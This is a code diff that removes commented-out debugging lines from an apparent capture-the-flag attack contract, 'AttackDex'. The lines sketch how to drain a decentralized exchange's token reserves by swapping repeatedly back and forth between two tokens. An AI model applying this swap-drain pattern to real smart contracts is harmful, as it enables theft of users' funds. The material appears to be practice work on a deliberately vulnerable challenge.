@@ -52,31 +52,3 @@ contract AttackDex{
 
     }
 }
-
-
-//player needs to approve coins for this attacker contract to use 
-        // console.log(address(this));
-        // IERC20(token1).transferFrom(msg.sender, address(this), IERC20(token1).balanceOf(msg.sender));
-        // console.log(dex.balanceOf(token1, address(this)));
-
-        // console.log(dex.balanceOf(token1, address(this)));
-        // console.log(IERC20(token1).balanceOf(msg.sender));
-        // IERC20(token1).transfer(address(this), 1);
-        // console.log(dex.balanceOf(token1, address(this)));
-
-        // dex.approve(address(dex), 9999); //allow dex contract to use our player's tokens
-        // console.log(dex.balanceOf(token2, msg.sender));
-        // console.log(IERC20(token2).balanceOf(msg.sender));
-        // console.log(IERC20(token2).balanceOf(address(this)));
-        
-        // dex.swap(token2, token1, dex.balanceOf(token2, msg.sender)); //start player where all in token1
-
-        // address tokenFrom = token1;
-        // address tokenTo = token2;
-        // while ((dex.balanceOf(token1,address(dex)) > 0)&&(dex.balanceOf(token2,address(dex)) > 0)) {
-        //     console.log("------");
-        //     console.log("token1:", dex.balanceOf(token1,msg.sender));
-        //     console.log("token2:", dex.balanceOf(token2,msg.sender));
-        //     lowerboundSwap(tokenFrom, tokenTo, dex.balanceOf(tokenFrom,msg.sender));
-        //     (tokenFrom, tokenTo) = (tokenTo, tokenFrom);
-        // }
